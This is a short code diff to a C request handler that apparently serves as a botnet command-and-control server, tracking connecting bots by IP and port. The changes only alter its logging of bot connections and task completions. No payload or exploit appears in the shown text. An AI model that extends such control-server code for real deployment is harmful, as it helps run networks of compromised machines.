@@ -305,8 +305,6 @@ int handle_request(void *cls, struct MHD_Connection *connection, const char *url
     struct in_addr address;
     inet_pton(AF_INET, bot_ip, &(address));
 
-    puts("\n");
-
     if (findBot(address, port) == -1)
     {
 
@@ -316,7 +314,7 @@ int handle_request(void *cls, struct MHD_Connection *connection, const char *url
         {
             const char *msg = "NOT OK";
         }
-        printf("\nBot Connected ");
+        printf("Bot with ip: %s Connected\n", bot_ip);
     }
 
     char *endpoint;
@@ -325,6 +323,9 @@ int handle_request(void *cls, struct MHD_Connection *connection, const char *url
     {
 
         printf("Bot completed its task... \n");
+        printf("Old Botnet: \n");
+        list_botnet(1);
+        puts("\n");
         int ID = 0;
         getBotID(bot_ip, bot_port, &ID);
 
@@ -339,8 +340,6 @@ int handle_request(void *cls, struct MHD_Connection *connection, const char *url
 
         endpoint = NULL;
     }
-
-    printf("Botnet updated:\n");
 
     MHD_destroy_response(response);
 
